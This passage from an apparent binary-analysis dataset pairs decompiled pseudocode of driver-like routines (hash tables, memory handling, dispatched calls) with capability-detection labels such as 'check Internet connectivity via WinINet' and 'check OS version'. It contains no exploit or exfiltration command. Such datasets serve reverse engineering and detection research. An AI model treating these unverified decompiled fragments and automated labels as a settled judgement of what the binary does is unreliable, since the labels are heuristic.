uVar1 = (**0xb1bde024)(&var_ch, &var_18h, *0xb1c5b714, stack0xffffffec + arg_14h, arg_18h);\n        if ((var_ch == 0) && (uVar1 = (**0xb1bde05c)(&var_ch, &var_1ch, *0xb1c5b718),  var_ch == 0)) {\n            for (var_20h = var_18h; *var_20h != NULL; var_20h = *var_20h) {\n            }\n            if (*(var_1ch + 8) == 0) {\n                *(var_1ch + 0xc) = var_20h;\n            }\n            *var_20h = *(var_1ch + 8);\n            *(var_1ch + 8) = var_18h;\n            *(var_1ch + 0x1c) = 0;\n            *(var_1ch + 0x40) = var_4h;\n            uVar1 = (**(arg_8h + 0x34))(*(arg_8h + 4), arg_ch, 0, arg_18h, var_1ch, &var_8h);\n            var_ch = uVar1;\n            if (uVar1 == 0) {\n                uVar1 = fcn.000524f0(arg_8h, stack0xffffffec, arg_14h, stack0xffffffec + arg_14h, var_8h);\n                var_11h._0_1_ = 1;\n            }\n            else if (uVar1 == 0x103) {\n                var_1ch = 0;\n                var_4h = 0;\n                var_18h = NULL;\n                stack0xffffffec = 0;\n                var_11h._0_1_ = 1;\n            }\n        }\n    }\n    if (var_1ch != 0) {\n        uVar1 = (**0xb1bde060)(var_1ch);\n    }\n    if (var_4h != 0) {\n        uVar1 = (**0xb1bde2ac)(var_4h);\n    }\n    if (var_18h != NULL) {\n        uVar1 = (**0xb1bde2ac)(var_18h);\n    }\n    if (stack0xffffffec != 0) {\n        uVar1 = fcn.00035330(stack0xffffffec);\n    }\n    return uVar1 & 0xffffff00 | var_11h;\n}\n",
        "token_count": 921
    },
    "00052420": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.00052420(void)\n\n{\n    int32_t arg_8h;\n    int32_t iVar1;\n    uint arg_ch;\n    int32_t iVar2;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    if (*0xb1c5b347 != '\\0') {\n        for (var_8h = 0; var_8h < 100; var_8h = var_8h + 1) {\n            fcn.00037150(0xb1c5b4c0, &var_4h, 0);\n            iVar2 = fcn.0003da90(var_8h, 1);\n            if ((iVar2 == 0) || (*(iVar2 + 8) != 0)) {\n                fcn.00037180(0xb1c5b4c0, &var_4h, 0);\n            }\n            else {\n                arg_8h = *(iVar2 + 0x430);\n                iVar1 = *(iVar2 + 0x444);\n                arg_ch = *(iVar2 + 0x448);\n                fcn.00037180(0xb1c5b4c0, &var_4h, 0);\n                fcn.00050a80(arg_8h, arg_ch);\n                if ((arg_8h == 0) && (iVar1 != 0)) {\n                    fcn.00051b90(var_8h);\n                }\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 359
    },
    "00052690": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00052690(int32_t *arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    uint var_4h;\n    \n    if (*(arg_ch + 0x430) != 0) {\n        *(arg_ch + 0x440) = arg_10h;\n        (**0xb1bde070)(arg_8h, *(arg_ch + 0x430));\n        if (*arg_8h == 0) {\n            *(arg_ch + 0x430) = 0;\n        }\n    }\n    return;\n}\n",
        "token_count": 129
    },
    "00052710": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00052710(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint var_14h;\n    uint var_10h;\n    uint *var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    if (*0xb1c5b347 == '\\0') {\n        uVar2 = 0xc0000001;\n    }\n    else {\n        fcn.00037150(0xb1c5b4c0, &var_8h, 0);\n        var_ch = *0xb1c5b4b8;\n        while ((var_ch != NULL &&\n               (((var_ch[2] != 0 || (var_ch[0x10c] == 0)) ||\n                ((*(var_ch[0x10c] + 8) != arg_8h && (cVar1 = fcn.00051010(var_ch[0x10c], arg_8h),  cVar1 == '\\0')))))))\n        {\n            var_ch = *var_ch;\n        }\n        if (var_ch == NULL) {\n            var_14h = 0;\n        }\n        else {\n            var_14h = var_ch[1];\n        }\n        var_4h = var_14h;\n        fcn.00037180(0xb1c5b4c0, &var_8h, 0);\n        if (var_ch == NULL) {\n            uVar2 = 0xc0000001;\n        }\n        else {\n            uVar2 = fcn.00051560(var_4h, arg_ch, arg_10h);\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 393
    },
    "00052800": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00052800(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    int32_t *var_14h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_ch = *0xb1c5b71c;\n    if (*0xb1c5b71c != 0) {\n        fcn.00051140(arg_8h, 0, 0, &var_14h, &var_10h);\n        var_1ch = var_10h;\n        if ((*(var_ch + 0x420) == 0x80) || (*(var_ch + 0x420) == 0x20)) {\n            fcn.00057030(0);\n            fcn.00037150(var_ch + 0x424, &var_8h, 0);\n            if (*(var_ch + 0x418) == 0) {\n                var_4h = 0;\n            }\n            else {\n                var_4h = fcn.00064de0(*(var_ch + 0x418));\n            }\n            fcn.00037180(var_ch + 0x424, &var_8h, 0);\n        }\n        else {\n            var_4h = 0;\n        }\n        if (var_4h != 0) {\n            fcn.00057060(0);\n            if (*var_14h == 0) {\n                if (*0x10 != 0x1c) {\n                    if ((*(var_14h + 6) & 5) == 0) {\n                        var_20h = (**0xb1bde224)(var_14h, 0);\n                    }\n                    else {\n                        var_20h = var_14h[3];\n                    }\n                    var_18h = var_20h;\n                }\n                var_1ch = var_14h[5];\n                if (0xe < var_1ch) {\n                    fcn.000524f0(*(var_ch + 0x430), var_18h, 0xe, var_18h + 0xe, var_1ch - 0xe);\n                }\n            }\n            else {\n                var_18h = fcn.00035230(var_1ch);\n                if (var_18h != 0) {\n                    iVar1 = fcn.00078772(var_14h, 0, var_18h, 0, var_1ch, &var_1ch);\n                    if ((iVar1 == 0) && (0xe < var_1ch)) {\n                        fcn.000524f0(*(var_ch + 0x430), var_18h, 0xe, var_18h + 0xe, var_1ch - 0xe);\n                    }\n                    fcn.00035330(var_18h);\n                }\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 684
    },
    "000529b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_88h\n\nvoid __cdecl fcn.000529b0(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_88h;\n    int32_t var_4h;\n    \n    iVar1 = fcn.00034c90();\n    if (iVar1 < 0x1b) {\n        fcn.00056090(arg_8h, arg_ch);\n        do {\n            iVar1 = fcn.00055c10();\n            if (iVar1 != 0) break;\n        } while (var_4h != 0);\n        fcn.00056210(arg_8h, arg_ch);\n        fcn.00052b10(arg_8h, arg_ch);\n    }\n    else {\n        do {\n            var_88h = arg_ch;\n            iVar1 = fcn.00045b00(arg_ch, &var_88h, 0x80, &var_4h, 0xffffffff);\n            if (iVar1 != 0) break;\n        } while (var_4h != 0);\n        fcn.00045ab0(arg_ch);\n    }\n    return;\n}\n",
        "token_count": 263
    },
    "00052ae0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00052ae0(code *arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00034c90();\n    if ((iVar1 < 0x1b) && (arg_8h != NULL)) {\n        (*arg_8h)(arg_ch, arg_10h, 0, 0, 0, 0, 4);\n    }\n    return;\n}\n",
        "token_count": 107
    },
    "00052b90": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00052b90(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_8h;\n    int32_t var_4h;\n    \n    iVar1 = fcn.0001b770(0xb1c5b724, 1, 0);\n    if (iVar1 == 1) {\n        var_4h = 0;\n    }\n    else {\n        iVar1 = fcn.00034a80(0xb1be25d8, &var_8h);\n        if (iVar1 == 0) {\n            iVar1 = fcn.0005c850(var_8h, 0xb1be25e0, 0xb1c5a78c);\n            if (iVar1 == 0) {\n                iVar1 = fcn.0005c850(var_8h, 0xb1be25f4, 0xb1c5a7b0);\n                if (iVar1 == 0) {\n                    var_4h = fcn.00052f30();\n                    if (((var_4h == 0) && (var_4h = fcn.00016190(0xb1be2608, 0xb1c5b720),  var_4h == 0)) &&\n                       (var_4h = fcn.00016090(*0xb1c5b720, 0xb1c1fce0, 0),  var_4h == 0)) {\n                        fcn.0007869a(3, 0xb1c5a790, 0x20, 0);\n                        var_4h = 0;\n                    }\n                    if (var_4h != 0) {\n                        fcn.00052c90(arg_8h);\n                        fcn.000674e0(0xb1c5b724);\n                    }\n                }\n                else {\n                    var_4h = -0x3fffffff;\n                }\n            }\n            else {\n                var_4h = -0x3fffffff;\n            }\n        }\n        else {\n            var_4h = -0x3fffffff;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 480
    },
    "00052c90": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.00052c90(void)\n\n{\n    if (*0xb1c5b724 != 0) {\n        *0xb1c5b724 = 0;\n        fcn.00052f80();\n        if (*0xb1c5b720 != 0) {\n            fcn.00016110(*0xb1c5b720);\n            (**0xb1bde2e4)();\n        }\n    }\n    return;\n}\n",
        "token_count": 99
    },
    "00052f30": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint fcn.00052f30(void)\n\n{\n    uint uVar1;\n    \n    *0xb1c5a788 = fcn.00035230(0x4000);\n    if (*0xb1c5a788 == 0) {\n        uVar1 = 0xc000009a;\n    }\n    else {\n        fcn.00078790(*0xb1c5a788, 0, 0x4000);\n        fcn.00032220(0xb1c67790);\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 130
    },
    "00052f80": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00053361)\n// WARNING: Removing unreachable block (ram,0x00053391)\n// WARNING: Removing unreachable block (ram,0x00053398)\n// WARNING: Removing unreachable block (ram,0x000533a1)\n// WARNING: Removing unreachable block (ram,0x000533b4)\n// WARNING: Removing unreachable block (ram,0x000533bd)\n// WARNING: Removing unreachable block (ram,0x000533cd)\n// WARNING: Removing unreachable block (ram,0x000533fa)\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Removing unreachable block (ram,0x00053131)\n// WARNING: Removing unreachable block (ram,0x00053098)\n// WARNING: Removing unreachable block (ram,0x000530c8)\n// WARNING: Removing unreachable block (ram,0x000530cf)\n// WARNING: Removing unreachable block (ram,0x000530d8)\n// WARNING: Removing unreachable block (ram,0x000530eb)\n// WARNING: Removing unreachable block (ram,0x000530f4)\n// WARNING: Removing unreachable block (ram,0x00053104)\n// WARNING: Removing unreachable block (ram,0x00053405)\n// WARNING: Removing unreachable block (ram,0x0005313c)\n// WARNING: Removing unreachable block (ram,0x0005341c)\n// WARNING: Removing unreachable block (ram,0x00053153)\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00052f80(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    int32_t var_54h;\n    int32_t var_50h;\n    int32_t var_4ch;\n    uint var_44h;\n    int32_t var_40h;\n    int32_t var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint *var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    var_14h = 0;\n    var_ch = 0;\n    if (*0xb1c5a788 != 0) {\n        (**0xb1bde0cc)(&var_28h, 0, 0);\n        for (var_8h = 0; var_8h < 0x1000; var_8h = var_8h + 1) {\ncode_r0x00052fcf:\n            var_18h = 0;\n            var_44h = 0;\n            var_1h._0_1_ = (**0xb1bde00c)();\n            for (var_10h = *(*0xb1c5a788 + var_8h * 4); var_10h != NULL; var_10h = *var_10h) {\n                if (((var_10h[8] != 0) && (var_10h[10] == 2)) && (*(var_10h + 0xb6) != 0)) {\n                    var_18h = var_10h[8];\n                    var_44h = var_10h[7];\n                    var_10h[8] = 0;\n                    break;\n                }\n            }\n            (**0xb1bde010)();\n            if (var_18h != 0) {\n                var_40h = (**0xb1bde230)(3, var_44h, 0, 0, 0, 0, 1, &var_28h, &var_4ch);\n                if (var_40h != 0) {\n                    iVar1 = *(var_40h + 0x60);\n                    *(iVar1 + -8) = 0;\n                    *(iVar1 + -4) = 0;\n                    *(iVar1 + -0x21) = 0;\n                    iVar1 = *(var_40h + 0x60);\n                    *(iVar1 + -0x24) = 0xf;\n                    *(iVar1 + -0x23) = 6;\n                    *(iVar1 + -0x10) = var_44h;\n                    *(iVar1 + -0xc) = var_18h;\n                    *(iVar1 + -0x20) = 4;\n                    *(iVar1 + -0x1c) = 0;\n                    *(iVar1 + -0x18) = 0;\n                    *(iVar1 + -0x14) = 0;\n                    var_3ch = (**0xb1bde290)();\n                    if (var_3ch == 0x103) {\n                        (**0xb1bde30c)(&var_28h, 0, 0, 0, 0);\n                        var_3ch = var_4ch;\n                    }\n                }\n                goto code_r0x00052fcf;\n            }\n        }\n        var_38h = 0xffb3b4c0;\n        var_34h = 0xffffffff;\n        (**0xb1bde310)(0, 0, &var_38h);\n        for (var_8h = 0; var_8h < 0x1000; var_8h = var_8h + 1) {\ncode_r0x00053233:\n            var_50h = 0;\n            var_44h = 0;\n            var_2ch = 0;\n            var_1h._0_1_ = (**0xb1bde00c)();\n            for (var_10h = *(*0xb1c5a788 + var_8h * 4); var_10h != NULL; var_10h = *var_10h) {\n                var_50h = 0;\n                if ((var_10h[8] != 0) && (var_10h[10] == 1)) {\n                    for (var_54h = 0; var_54h < 0xb; var_54h = var_54h + 1) {\n                        if (var_10h[var_54h * 3 + 0xc] != 0) {\n                            var_14h = var_54h;\n                            var_50h = var_10h[var_54h * 3 + 0xc];\n                            var_ch = var_10h[var_54h * 3 + 0xd];\n                            var_44h = var_10h[7];\n                            var_2ch = var_10h[8];\n                            var_10h[var_54h * 3 + 0xc] = 0;\n                            break;\n                        }\n                    }\n                    if (var_50h != 0) break;\n                }\n            }\n            (**0xb1bde010)();\n            if (var_50h != 0) {\n                var_40h = (**0xb1bde230)(3, var_44h, 0, 0, 0, 0, 1, &var_28h, &var_4ch);\n                if (var_40h != 0) {\n                    iVar1 = *(var_40h + 0x60);\n                    *(iVar1 + -8) = 0;\n                    *(iVar1 + -4) = 0;\n                    *(iVar1 + -0x21) = 0;\n                    iVar1 = *(var_40h + 0x60);\n                    *(iVar1 + -0x24) = 0xf;\n                    *(iVar1 + -0x23) = 0xb;\n                    *(iVar1 + -0x10) = var_44h;\n                    *(iVar1 + -0xc) = var_2ch;\n                    *(iVar1 + -0x20) = var_14h;\n                    *(iVar1 + -0x1c) = var_50h;\n                    *(iVar1 + -0x18) = var_ch;\n                    var_3ch = (**0xb1bde290)();\n                    if (var_3ch == 0x103) {\n                        (**0xb1bde30c)(&var_28h, 0, 0, 0, 0);\n                        var_3ch = var_4ch;\n                    }\n                    var_10h = fcn.000538d0(var_2ch, &var_1h);\n                    if (var_10h != NULL) {\n                        var_10h[var_14h * 3 + 0xc] = 0;\n                        (**0xb1bde010)();\n                    }\n                }\n                goto code_r0x00053233;\n            }\n        }\n        var_1h._0_1_ = (**0xb1bde00c)();\n        for (var_8h = 0; var_8h < 0x1000; var_8h = var_8h + 1) {\n            var_10h = *(*0xb1c5a788 + var_8h * 4);\n            while (var_10h != NULL) {\n                puVar2 = *var_10h;\n                fcn.00035330(var_10h);\n                var_10h = puVar2;\n            }\n        }\n        fcn.00035330(*0xb1c5a788);\n        *0xb1c5a788 = 0;\n        (**0xb1bde010)();\n    }\n    return;\n}\n",
        "token_count": 2158
    },
    "00053570": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00053570(uint arg_8h, uint32_t arg_ch, uint arg_10h, uint arg_14h, uint *arg_18h, int32_t arg_1ch)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    uint var_34h;\n    uint *var_30h;\n    uint *var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint *var_20h;\n    uint var_1ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    uVar3 = (arg_ch >> 5) % 0x1000;\n    var_1h._0_1_ = 0;\n    if (arg_ch == 0) {\n        return 0xc00000f0;\n    }\n    fcn.00036880(&var_1ch, 0x11);\n    if (arg_1ch == 0) {\n        var_1h._0_1_ = (**0xb1bde00c)();\n    }\n    for (var_20h = *(*0xb1c5a788 + uVar3 * 4); (var_20h != NULL && (var_20h[8] != arg_ch)); var_20h = *var_20h) {\n    }\n    if (var_20h == NULL) {\n        var_20h = fcn.00035230(0x164);\n        if (var_20h == NULL) {\n            var_24h = 0xc000009a;\n            goto code_r0x000537cd;\n        }\n        fcn.00078790(var_20h, 0, 0x164);\n        *var_20h = *(*0xb1c5a788 + uVar3 * 4);\n        *(*0xb1c5a788 + uVar3 * 4) = var_20h;\n        var_20h[8] = arg_ch;\n        for (var_8h = 0; var_8h < 0xb; var_8h = var_8h + 1) {\n            var_20h[var_8h * 3 + 0xb] = arg_ch;\n        }\n    }\n    else {\n        var_20h[9] = 0;\n        fcn.00078790(var_20h + 0xb, 0, 0x84);\n        fcn.00078790(var_20h + 0x2c, 0, 0x4b);\n        fcn.00078790(var_20h + 0xfb, 0, 0x4b);\n        var_20h[0x52] = 0;\n        var_20h[0x53] = 0;\n        var_20h[0x54] = 0;\n        *(var_20h + 0x55) = 0;\n        *(var_20h + 0x155) = 0;\n        var_20h[0x56] = 0;\n        for (var_8h = 0; var_8h < 0xb; var_8h = var_8h + 1) {\n            var_20h[var_8h * 3 + 0xb] = arg_ch;\n        }\n    }\n    uVar2 = fcn.000785a4();\n    var_20h[1] = uVar2;\n    var_2ch = &var_1ch;\n    var_30h = var_20h + 2;\n    do {\n        cVar1 = *var_2ch;\n        *var_30h = cVar1;\n        var_2ch = var_2ch + 1;\n        var_30h = var_30h + 1;\n    } while (cVar1 != '\\0');\n    var_20h[7] = arg_8h;\n    var_20h[10] = arg_10h;\n    var_20h[0x52] = 0x54694343;\n    var_20h[0x54] = arg_14h;\n    var_20h[0x53] = arg_ch;\n    if (arg_18h != NULL) {\n        *arg_18h = var_20h + 0x52;\n    }\n    fcn.00032200(var_20h + 0x57);\n    var_24h = 0;\ncode_r0x000537cd:\n    if (arg_1ch == 0) {\n        (**0xb1bde010)();\n    }\n    return var_24h;\n}\n",
        "token_count": 1056
    },
    "000537f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.000537f0(uint32_t arg_8h, uint *arg_ch)\n\n{\n    uint32_t uVar1;\n    uint var_14h;\n    uint var_10h;\n    uint *var_ch;\n    uint *var_8h;\n    uint var_1h;\n    \n    uVar1 = (arg_8h >> 5) % 0x1000;\n    if (arg_8h == 0) {\n        var_10h = 0xc00000ef;\n    }\n    else {\n        (**0xb1bde00c)();\n        var_ch = NULL;\n        for (var_8h = *(*0xb1c5a788 + uVar1 * 4); (var_8h != NULL && (var_8h[8] != arg_8h)); var_8h = *var_8h) {\n            var_ch = var_8h;\n        }\n        if (var_8h == NULL) {\n            var_10h = 0xc0000034;\n        }\n        else {\n            if (arg_ch != NULL) {\n                *arg_ch = var_8h[10];\n            }\n            if (var_ch == NULL) {\n                *(*0xb1c5a788 + uVar1 * 4) = *var_8h;\n            }\n            else {\n                *var_ch = *var_8h;\n            }\n            fcn.00035330(var_8h);\n            var_10h = 0;\n        }\n        (**0xb1bde010)();\n    }\n    return var_10h;\n}\n",
        "token_count": 366
    },
    "000538d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.000538d0(uint32_t arg_8h, uchar *arg_ch)\n\n{\n    uchar uVar1;\n    uint var_8h;\n    uint *var_4h;\n    \n    if ((arg_8h == 0) || (*0xb1c5a788 == 0)) {\n        var_4h = NULL;\n    }\n    else {\n        if (arg_ch != NULL) {\n            uVar1 = (**0xb1bde00c)();\n            *arg_ch = uVar1;\n        }\n        for (var_4h = *(*0xb1c5a788 + ((arg_8h >> 5) % 0x1000) * 4); (var_4h != NULL && (var_4h[8] != arg_8h));\n            var_4h = *var_4h) {\n        }\n        if ((var_4h == NULL) && (arg_ch != NULL)) {\n            (**0xb1bde010)();\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 233
    },
    "00053970": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint32_t __cdecl fcn.00053970(uint noname_0, uint32_t arg_ch, int32_t arg_10h, uint32_t arg_14h)\n\n{\n    uint16_t extraout_var;\n    uint var_14h;\n    uint32_t var_10h;\n    uint *var_ch;\n    uint32_t var_8h;\n    uint var_1h;\n    \n    var_10h = 0;\n    (**0xb1bde00c)();\n    var_8h = 0;\n    do {\n        if (0xfff < var_8h) {\ncode_r0x00053a0d:\n            (**0xb1bde010)();\n            if (var_10h == 0) {\n                var_10h = fcn.00037d20(arg_ch & 0xffff | extraout_var << 0x10);\n            }\n            return var_10h;\n        }\n        for (var_ch = *(*0xb1c5a788 + var_8h * 4); var_ch != NULL; var_ch = *var_ch) {\n            if ((((var_ch[8] != 0) && (var_ch[10] == 2)) && (*(var_ch + 0xb6) == arg_10h)) &&\n               (*(var_ch + 0x2d) == arg_14h)) {\n                var_10h = *(var_ch + 0x55);\n                goto code_r0x00053a0d;\n            }\n        }\n        var_8h = var_8h + 1;\n    } while( true );\n}\n",
        "token_count": 364
    },
    "00053a40": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.00053a40(void)\n\n{\n    int32_t iVar1;\n    uint *var_10h;\n    uint32_t var_ch;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    (**0xb1bde00c)();\n    for (var_ch = 0; var_ch < 0x1000; var_ch = var_ch + 1) {\n        for (var_10h = *(*0xb1c5a788 + var_ch * 4); var_10h != NULL; var_10h = *var_10h) {\n            if (((var_10h[8] != 0) && (var_10h[10] == 2)) && (*(var_10h + 0x55) != '\\0')) {\n                var_4h = var_4h + 1;\n            }\n        }\n    }\n    (**0xb1bde010)();\n    iVar1 = fcn.00037cd0();\n    return iVar1 + var_4h;\n}\n",
        "token_count": 231
    },
    "00053af0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00053af0(int32_t arg_8h, int32_t arg_ch, uint *arg_10h)\n\n{\n    uint *arg_18h;\n    int32_t iVar1;\n    uint var_3ch;\n    int32_t var_38h;\n    int32_t var_34h;\n    int32_t *var_30h;\n    int32_t *var_2ch;\n    uint32_t var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t *var_18h;\n    int32_t *var_14h;\n    uint32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = *(arg_8h + 0xc);\n    if (iVar1 == 0) {\n        return 1;\n    }\n    if (*(iVar1 + 5) == '\\x10') {\n        var_14h = 0xb1be2620;\n        var_18h = iVar1 + 8;\n        for (var_10h = 0x10; 3 < var_10h; var_10h = var_10h - 4) {\n            if (*var_18h != *var_14h) goto code_r0x00053b5a;\n            var_14h = var_14h + 1;\n            var_18h = var_18h + 1;\n        }\n        if (var_10h == 0) {\ncode_r0x00053bdc:\n            var_20h = 0;\n        }\n        else {\ncode_r0x00053b5a:\n            var_1ch = *var_18h - *var_14h;\n            if (var_1ch == 0) {\n                if (var_10h == 1) goto code_r0x00053bdc;\n                var_1ch = *(var_18h + 1) - *(var_14h + 1);\n                if (var_1ch == 0) {\n                    if (var_10h == 2) goto code_r0x00053bdc;\n                    var_1ch = *(var_18h + 2) - *(var_14h + 2);\n                    if (var_1ch == 0) {\n                        if ((var_10h == 3) || (var_1ch = *(var_18h + 3) - *(var_14h + 3),  var_1ch == 0))\n                        goto code_r0x00053bdc;\n                    }\n                }\n            }\n            var_20h = 1;\n            if (var_1ch < 1) {\n                var_20h = -1;\n            }\n        }\n        if (var_20h == 0) {\n            iVar1 = fcn.00053570(*(arg_ch + 0x14), *(arg_ch + 0x18), 1, 0, 0, 0);\n            if (iVar1 == 0) {\n                *arg_10h = 0xb1c20dc0;\n                arg_10h[1] = *(arg_ch + 0x18);\n                return 1;\n            }\n            *(arg_8h + 0x18) = iVar1;\n            return 0;\n        }\n    }\n    if (*(iVar1 + 5) != '\\x11') {\n        return 1;\n    }\n    var_2ch = 0xb1be2634;\n    var_30h = iVar1 + 8;\n    for (var_28h = 0x11; 3 < var_28h; var_28h = var_28h - 4) {\n        if (*var_30h != *var_2ch) goto code_r0x00053ca4;\n        var_2ch = var_2ch + 1;\n        var_30h = var_30h + 1;\n    }\n    if (var_28h == 0) {\ncode_r0x00053d26:\n        var_38h = 0;\n    }\n    else {\ncode_r0x00053ca4:\n        var_34h = *var_30h - *var_2ch;\n        if (var_34h == 0) {\n            if (var_28h == 1) goto code_r0x00053d26;\n            var_34h = *(var_30h + 1) - *(var_2ch + 1);\n            if (var_34h == 0) {\n                if (var_28h == 2) goto code_r0x00053d26;\n                var_34h = *(var_30h + 2) - *(var_2ch + 2);\n                if (var_34h == 0) {\n                    if ((var_28h == 3) || (var_34h = *(var_30h + 3) - *(var_2ch + 3),  var_34h == 0))\n                    goto code_r0x00053d26;\n                }\n            }\n        }\n        var_38h = 1;\n        if (var_34h < 1) {\n            var_38h = -1;\n        }\n    }\n    if (var_38h == 0) {\n        arg_18h = iVar1 + 9 + *(iVar1 